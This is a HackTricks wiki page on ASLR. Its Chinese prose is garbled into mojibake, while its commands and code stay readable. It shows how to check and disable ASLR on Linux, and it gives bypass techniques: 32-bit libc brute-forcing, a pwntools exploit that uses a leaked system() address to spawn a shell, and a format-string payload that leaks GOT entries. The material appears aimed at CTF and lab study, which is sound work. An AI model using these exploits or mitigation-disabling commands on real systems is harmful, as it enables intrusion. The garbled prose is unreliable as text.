# ASLR

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

**åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼ˆASLRï¼‰**æ˜¯æ“ä½œç³»ç»Ÿä¸­ä½¿ç”¨çš„ä¸€ç§å®‰å…¨æŠ€æœ¯ï¼Œç”¨äº**éšæœºåŒ–ç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºè¿›ç¨‹ä½¿ç”¨çš„å†…å­˜åœ°å€**ã€‚é€šè¿‡è¿™æ ·åšï¼Œå®ƒæ˜¾è‘—å¢åŠ äº†æ”»å‡»è€…é¢„æµ‹ç‰¹å®šè¿›ç¨‹å’Œæ•°æ®ä½ç½®ï¼ˆå¦‚å †æ ˆã€å †å’Œåº“ï¼‰çš„éš¾åº¦ï¼Œä»è€Œå‡è½»äº†æŸäº›ç±»å‹çš„åˆ©ç”¨ï¼Œç‰¹åˆ«æ˜¯ç¼“å†²åŒºæº¢å‡ºã€‚

### **æ£€æŸ¥ASLRçŠ¶æ€**

è¦åœ¨Linuxç³»ç»Ÿä¸Š**æ£€æŸ¥**ASLRçŠ¶æ€ï¼Œå¯ä»¥ä»`/proc/sys/kernel/randomize_va_space`æ–‡ä»¶ä¸­è¯»å–å€¼ã€‚å­˜å‚¨åœ¨æ­¤æ–‡ä»¶ä¸­çš„å€¼ç¡®å®šåº”ç”¨çš„ASLRç±»å‹ï¼š

* **0**ï¼šæ— éšæœºåŒ–ã€‚ä¸€åˆ‡éƒ½æ˜¯é™æ€çš„ã€‚
* **1**ï¼šä¿å®ˆéšæœºåŒ–ã€‚å…±äº«åº“ã€å †æ ˆã€mmap()ã€VDSOé¡µè¢«éšæœºåŒ–ã€‚
* **2**ï¼šå®Œå…¨éšæœºåŒ–ã€‚é™¤äº†ä¿å®ˆéšæœºåŒ–éšæœºåŒ–çš„å…ƒç´ å¤–ï¼Œé€šè¿‡`brk()`ç®¡ç†çš„å†…å­˜ä¹Ÿè¢«éšæœºåŒ–ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ£€æŸ¥ASLRçŠ¶æ€ï¼š
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **ç¦ç”¨ ASLR**

è¦**ç¦ç”¨** ASLRï¼Œæ‚¨éœ€è¦å°† `/proc/sys/kernel/randomize_va_space` çš„å€¼è®¾ç½®ä¸º **0**ã€‚é€šå¸¸ä¸å»ºè®®åœ¨æµ‹è¯•æˆ–è°ƒè¯•åœºæ™¯ä¹‹å¤–ç¦ç”¨ ASLRã€‚ä»¥ä¸‹æ˜¯ç¦ç”¨æ–¹æ³•ï¼š
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
æ‚¨è¿˜å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç¦ç”¨æ‰§è¡Œçš„ASLRï¼š
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **å¯ç”¨ASLR**

è¦**å¯ç”¨**ASLRï¼Œæ‚¨å¯ä»¥å°†å€¼**2**å†™å…¥`/proc/sys/kernel/randomize_va_space`æ–‡ä»¶ã€‚é€šå¸¸éœ€è¦rootæƒé™ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯ç”¨å®Œå…¨éšæœºåŒ–ï¼š
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **è·¨é‡å¯ä¿æŒ**

ä½¿ç”¨`echo`å‘½ä»¤è¿›è¡Œçš„æ›´æ”¹æ˜¯ä¸´æ—¶çš„ï¼Œå°†åœ¨é‡æ–°å¯åŠ¨æ—¶é‡ç½®ã€‚è¦ä½¿æ›´æ”¹æŒä¹…åŒ–ï¼Œæ‚¨éœ€è¦ç¼–è¾‘`/etc/sysctl.conf`æ–‡ä»¶å¹¶æ·»åŠ æˆ–ä¿®æ”¹ä»¥ä¸‹è¡Œï¼š
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
åœ¨ç¼–è¾‘ `/etc/sysctl.conf` åï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åº”ç”¨æ›´æ”¹ï¼š
```bash
sudo sysctl -p
```
è¿™å°†ç¡®ä¿æ‚¨çš„ASLRè®¾ç½®åœ¨é‡æ–°å¯åŠ¨åä¿æŒä¸å˜ã€‚

## **ç»•è¿‡**

### 32ä½æš´åŠ›ç ´è§£

PaXå°†è¿›ç¨‹åœ°å€ç©ºé—´åˆ†ä¸º**3ç»„**ï¼š

* **ä»£ç å’Œæ•°æ®**ï¼ˆå·²åˆå§‹åŒ–å’Œæœªåˆå§‹åŒ–ï¼‰ï¼š`.text`ã€`.data` å’Œ `.bss` â€”> `delta_exec` å˜é‡ä¸­çš„**16ä½**ç†µã€‚è¯¥å˜é‡åœ¨æ¯ä¸ªè¿›ç¨‹ä¸­éšæœºåˆå§‹åŒ–ï¼Œå¹¶æ·»åŠ åˆ°åˆå§‹åœ°å€ä¸­ã€‚
* ç”± `mmap()` åˆ†é…çš„**å†…å­˜**å’Œ**å…±äº«åº“** â€”> **16ä½**ï¼Œç§°ä¸º `delta_mmap`ã€‚
* **æ ˆ** â€”> **24ä½**ï¼Œç§°ä¸º `delta_stack`ã€‚ä½†å®é™…ä¸Šåªä½¿ç”¨**11ä½**ï¼ˆä»ç¬¬10åˆ°ç¬¬20å­—èŠ‚ï¼ŒåŒ…æ‹¬åœ¨å†…ï¼‰ï¼Œå¯¹é½åˆ°**16å­—èŠ‚** â€”> è¿™å¯¼è‡´**524,288ä¸ªå¯èƒ½çš„çœŸå®æ ˆåœ°å€**ã€‚

ä¸Šè¿°æ•°æ®é€‚ç”¨äº32ä½ç³»ç»Ÿï¼Œé™ä½çš„æœ€ç»ˆç†µä½¿å¾—å¯ä»¥é€šè¿‡å¤šæ¬¡å°è¯•æ‰§è¡Œæ¥ç»•è¿‡ASLRï¼Œç›´åˆ°åˆ©ç”¨æˆåŠŸå®Œæˆã€‚

#### æš´åŠ›ç ´è§£æ€è·¯ï¼š

* å¦‚æœåˆ©ç”¨æ˜¯æœ¬åœ°çš„ï¼Œæ‚¨å¯ä»¥å°è¯•æš´åŠ›ç ´è§£libcçš„åŸºåœ°å€ï¼ˆå¯¹äº32ä½ç³»ç»Ÿå¾ˆæœ‰ç”¨ï¼‰:
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* å½“æ”»å‡»è¿œç¨‹æœåŠ¡å™¨æ—¶ï¼Œæ‚¨å¯ä»¥å°è¯•**æš´åŠ›ç ´è§£`libc`å‡½æ•°`usleep`çš„åœ°å€**ï¼Œå°†10ä½œä¸ºå‚æ•°ä¼ é€’ã€‚å¦‚æœæŸä¸ªæ—¶åˆ»**æœåŠ¡å™¨éœ€è¦é¢å¤–10ç§’æ‰èƒ½å“åº”**ï¼Œåˆ™æ‰¾åˆ°äº†è¯¥å‡½æ•°çš„åœ°å€ã€‚

{% hint style="success" %}
åœ¨64ä½ç³»ç»Ÿä¸­ï¼Œç†µå€¼æ›´é«˜ï¼Œè¿™æ˜¯ä¸å¯èƒ½çš„ã€‚
{% endhint %}

### æœ‰äº†æ³„æ¼

* **æŒ‘æˆ˜æ˜¯æä¾›ä¸€ä¸ªæ³„æ¼**

å¦‚æœæ‚¨è·å¾—äº†ä¸€ä¸ªæ³„æ¼ï¼ˆç®€å•çš„CTFæŒ‘æˆ˜ï¼‰ï¼Œæ‚¨å¯ä»¥ä»ä¸­è®¡ç®—åç§»é‡ï¼ˆå‡è®¾æ‚¨çŸ¥é“æ­£åœ¨åˆ©ç”¨çš„ç³»ç»Ÿä¸­ä½¿ç”¨çš„ç¡®åˆ‡libcç‰ˆæœ¬ï¼‰ã€‚è¿™ä¸ªç¤ºä¾‹åˆ©ç”¨æ˜¯ä»[**è¿™é‡Œçš„ç¤ºä¾‹**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak)ä¸­æå–çš„ï¼ˆæŸ¥çœ‹è¯¥é¡µé¢ä»¥è·å–æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼‰:
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
* **ret2plt**

é€šè¿‡åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºï¼Œå¯ä»¥åˆ©ç”¨ **ret2plt** æ¥çªƒå–æ¥è‡ª libc çš„å‡½æ•°åœ°å€ã€‚æŸ¥çœ‹ï¼š

{% content-ref url="ret2plt.md" %}
[ret2plt.md](ret2plt.md)
{% endcontent-ref %}

* **æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»»æ„è¯»å–**

å°±åƒåœ¨ ret2plt ä¸­ä¸€æ ·ï¼Œå¦‚æœé€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å…·æœ‰ä»»æ„è¯»å–æƒé™ï¼Œåˆ™å¯ä»¥ä» GOT ä¸­çªƒå– **libc å‡½æ•°** çš„åœ°å€ã€‚ä»¥ä¸‹[**ç¤ºä¾‹æ¥è‡ªæ­¤å¤„**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
æ‚¨å¯ä»¥åœ¨ä»¥ä¸‹ä½ç½®æ‰¾åˆ°æœ‰å…³æ ¼å¼å­—ç¬¦ä¸²ä»»æ„è¯»å–çš„æ›´å¤šä¿¡æ¯ï¼š

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

### Ret2ret

å°è¯•é€šè¿‡æ»¥ç”¨å †æ ˆå†…éƒ¨åœ°å€æ¥ç»•è¿‡ASLRï¼š

{% content-ref url="../../stack-overflow/ret2ret.md" %}
[ret2ret.md](../../stack-overflow/ret2ret.md)
{% endcontent-ref %}
